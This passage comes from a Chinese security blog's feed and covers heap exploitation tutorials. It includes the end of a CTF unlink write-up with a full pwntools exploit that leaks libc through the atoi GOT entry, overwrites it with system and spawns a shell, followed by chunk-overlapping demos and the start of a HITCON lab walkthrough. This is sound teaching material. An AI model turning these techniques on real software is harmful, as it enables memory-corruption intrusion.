class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]      变量类型为unsigned，因此0-1=unsigned最大值</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//////// 令a2=0，将循环unsigned最大值次，可以造成堆溢出</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>note操作如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">note2 = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(id, choice, s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br></pre></td></tr></table></figure><h4 id="构造三个chunk用于实现unlink"><a href="#构造三个chunk用于实现unlink" class="headerlink" title="构造三个chunk用于实现unlink"></a>构造三个chunk用于实现unlink</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Input your name:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your address:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0: a fake chunk</span></span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x61</span>) + p64(fakefd) + p64(fakebk) + <span class="string">'b'</span> * <span class="number">64</span> + p64(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#content = p64(fakefd) + p64(fakebk)</span></span><br><span class="line">newnote(<span class="number">128</span>, content)</span><br><span class="line"><span class="comment"># chunk1: a zero size chunk produce overwrite</span></span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># chunk2: a chunk to be overwrited and freed</span></span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>chunk0 中一共构造了两个 chunk</p><ul><li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li><li><p>chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</p><p>  // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。<br>  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</p><pre><code>malloc_printerr (&quot;corrupted size vs. prev_size&quot;);    </code></pre></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x/50xg 0x144d280</span><br><span class="line">0x144d280:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d290:0x00000000000000000x0000000000000091  ======&gt; chunk0   size=0x80</span><br><span class="line">0x144d2a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x144d2b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk</span><br><span class="line">0x144d2c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d2f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d300:0x00000000000000600x0000000000000000 ------&gt; prev_size=0x60</span><br><span class="line">0x144d310:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d320:0x00000000000000000x0000000000000021  ======&gt; chunk1   size=0</span><br><span class="line">0x144d330:0x61616161616161610x0000000000000000</span><br><span class="line">0x144d340:0x00000000000000000x0000000000000091  ======&gt; chunk2   size=0x80</span><br><span class="line">0x144d350:0x62626262626262620x6262626262626262</span><br><span class="line">0x144d360:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d370:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d380:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d390:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x144d3d0:0x00000000000000000x0000000000020c31  ======&gt; top chunk</span><br></pre></td></tr></table></figure><h4 id="释放-chunk1-覆盖-chunk2-释放-chunk2"><a href="#释放-chunk1-覆盖-chunk2-释放-chunk2" class="headerlink" title="释放 chunk1 - 覆盖 chunk2 - 释放 chunk2"></a>释放 chunk1 - 覆盖 chunk2 - 释放 chunk2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># edit the chunk1 to overwrite the chunk2</span></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>, content)</span><br><span class="line"><span class="comment"># delete note 2 to trigger the unlink</span></span><br><span class="line"><span class="comment"># after unlink, ptr[0] = ptr - 0x18</span></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前堆内构造</span><br><span class="line">pwndbg&gt; x/50xg 0x1a94280</span><br><span class="line">0x1a94280:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94290:0x00000000000000000x0000000000000091  ======&gt; chunk0   size=0x80</span><br><span class="line">0x1a942a0:0x61616161616161610x0000000000000061</span><br><span class="line">0x1a942b0:0x00000000006021080x0000000000602110 ------&gt; fd  bk   ptr[0]</span><br><span class="line">0x1a942c0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942d0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942e0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a942f0:0x62626262626262620x6262626262626262</span><br><span class="line">0x1a94300:0x00000000000000600x0000000000000000 ------&gt; fake prev_size=0x60   unused</span><br><span class="line">0x1a94310:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94320:0x00000000000000000x0000000000000021  ======&gt; chunk1   size=0</span><br><span class="line">0x1a94330:0x61616161616161610x6161616161616161</span><br><span class="line">0x1a94340:0x00000000000000a00x0000000000000090 </span><br><span class="line">0x1a94350:0x00000000000000000x0000000001a94010</span><br><span class="line">0x1a94360:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94370:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94380:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a94390:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1a943d0:0x00000000000000000x0000000000020c31</span><br><span class="line">0x1a943e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p><h4 id="获取-system-地址"><a href="#获取-system-地址" class="headerlink" title="获取 system 地址"></a>获取 system 地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the chunk0(which is ptr[0]) with got atoi</span></span><br><span class="line">atoi_got = note2.got[<span class="string">'atoi'</span>]</span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"><span class="comment"># get the aoti addr</span></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak atoi addr: '</span> + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get system addr</span></span><br><span class="line">atoi_offest = libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak system addr: '</span>, hex(system_addr)</span><br></pre></td></tr></table></figure><p>前面已经修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里将其覆盖为 atoi 的地址。 这样的话，如果查看 note 0 的内容，其实查看的就是 atoi 的地址。之后我们根据 libc 中对应的偏移计算出 system 的地址。</p><h4 id="修改-atoi-got"><a href="#修改-atoi-got" class="headerlink" title="修改 atoi got"></a>修改 atoi got</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># overwrite the atoi got with systemaddr</span></span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br></pre></td></tr></table></figure><p>此时 ptr[0] 的地址 got 表的地址，所以可以直接修改该 note，覆盖为 system 地址。</p><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">sh.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>此时如果再调用 atoi ，其实调用的就是 system 函数。</p><p>From <a href="https://kabeor.github.io/堆溢出-Unlink/">https://kabeor.github.io/堆溢出-Unlink/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆溢出-Unlink&quot;&gt;&lt;a href=&quot;#堆溢出-Unlink&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Unlink&quot;&gt;&lt;/a&gt;堆溢出-Unlink&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Chunk Extend and Overlapping</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Chunk%20Extend%20and%20Overlapping/"/>
    <id>https://kabeor.github.io/堆溢出-Chunk Extend and Overlapping/</id>
    <published>2020-01-05T10:00:47.575Z</published>
    <updated>2020-01-05T10:02:08.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Chunk-Extend-and-Overlapping"><a href="#堆溢出-Chunk-Extend-and-Overlapping" class="headerlink" title="堆溢出-Chunk Extend and Overlapping"></a>堆溢出-Chunk Extend and Overlapping</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><blockquote><p>作用</p></blockquote><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h2><p>该利用的效果是通过更改第一个块的大小来控制第二个块的内容。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>当把chunk 1 size改为0x41(0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小)，chunk 2被chunk 1包含进去，，当把chunk1释放时chunk2被一同释放，再申请一个比chunk1大的块就能直接控制chunk2(不要覆盖top chunk)，称为 overlapping chunk。</p><h2 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h2><p>处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。（fastbin 默认的最大的 chunk 可使用范围是 0x70）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1     大小 &gt; fastbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;   <span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">堆内布局</span><br><span class="line">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin，再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容。</p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin</span><br><span class="line">0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>首先释放 chunk1 使它进入 unsorted bin 中，然后篡改 chunk1 的 size 域，此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc(0x10)申请的都是fastbin。</p><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h2 id="例-HITCON-Trainging-lab13"><a href="#例-HITCON-Trainging-lab13" class="headerlink" title="例 HITCON Trainging lab13"></a>例 HITCON Trainging lab13</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">功能</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"          Heap Creator          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 1. Create a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 2. Edit a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 3. Show a Heap                 "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 4. Delete a Heap               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" 5. Exit                        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"--------------------------------"</span>);</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">( heaparray[v1] )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>, &amp;buf);</span><br><span class="line">    read_input(*(heaparray[v1] + <span class="number">1</span>), *heaparray[v1] + <span class="number">1L</span>L);   <span class="comment">// off-by-one</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol><li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li><li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>break *0x400D76</p><p>创建两个大小为0x14的堆块，heap命令查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603290</span><br><span class="line">0x603290:0x00000000000000000x0000000000000021  ===&gt;chunk1</span><br><span class="line">0x6032a0:0x00000000000000140x00000000006032c0  指向</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000021  ===&gt;chunk1数据</span><br><span class="line">0x6032c0:0x61616161616161610x6161616161616161  长度0x14</span><br><span class="line">0x6032d0:0x00000000616161610x0000000000000021  ===&gt;chunk2</span><br><span class="line">0x6032e0:0x00000000000000140x0000000000603300</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000021  ===&gt;chunk2数据</span><br><span class="line">0x603300:0x62626262626262620x6262626262626262  长度0x14</span><br><span class="line">0x603310:0x00000000626262620x0000000000020cf1  ===&gt;top chunk</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>因此堆中保存的结构为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span 